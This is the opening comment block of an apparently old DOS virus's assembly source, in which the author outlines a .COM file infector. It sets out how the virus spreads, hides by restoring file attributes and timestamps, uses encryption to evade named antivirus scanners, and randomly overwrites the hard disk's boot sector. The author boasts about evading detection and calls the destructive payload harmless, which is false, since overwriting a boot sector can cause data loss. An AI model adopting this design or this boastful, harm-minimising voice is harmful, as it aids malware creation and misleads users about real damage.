; Well this is my (Raver's) first scratch virus.
; This virus is mainly made for educational purpose (my own!).
; It's pretty well commented in an easy way so even you folks
; with little experience with assembler should be able to follow
; the code!

; It's a pretty simple non-overwriting .com-infector with a harmless
; nuking routine. It clears and restores the file attributes and
; date/time stamp and finds and infects files using the dot-dot method.
; An encryption routine and some "unusual" instructions are included to
; avoid detection by the common virus scanners. At release date, see
; above, neither F-prot nor Tb-scan found traces of virus code!

; There is about a 5 percent chance that the nuking routine will be
; activated, it checks the system time for 1/100 of a second. If it's
; activated it'll overwrite the first sector on the fixed disk (c:)
; which contains the boot sector. This might seem cruel but, infact,
; it's quite harmless 'cause norton utilities and other programs
; easily restore the boot sector. It's there just to make inexperienced
; users (lamers!) nervous!
